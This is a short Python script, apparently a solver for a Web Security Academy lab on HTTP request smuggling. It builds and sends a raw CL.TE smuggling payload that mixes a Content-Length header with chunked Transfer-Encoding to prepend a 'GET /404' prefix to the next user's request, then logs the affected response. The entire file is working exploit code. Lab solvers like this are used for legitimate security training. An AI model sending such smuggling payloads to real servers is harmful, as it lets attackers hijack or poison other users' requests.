from web_security_academy.core.logger import logger
from urllib.parse import urlparse


def solve_lab(session):
    hostname = urlparse(session.url).hostname
    smuggled_prefix = "GET /404 HTTP/1.1\r\nFoo: "

    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        f"Content-Length: {len(smuggled_prefix) + 5}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"{smuggled_prefix}"
    ).encode()

    session.send_raw(payload)
    logger.info("Prepended the following to the next request:")
    print(smuggled_prefix)

    resp = session.get_path("/")
    logger.info("Received the following response after sending HTTP request:")
    logger.info(resp.text)
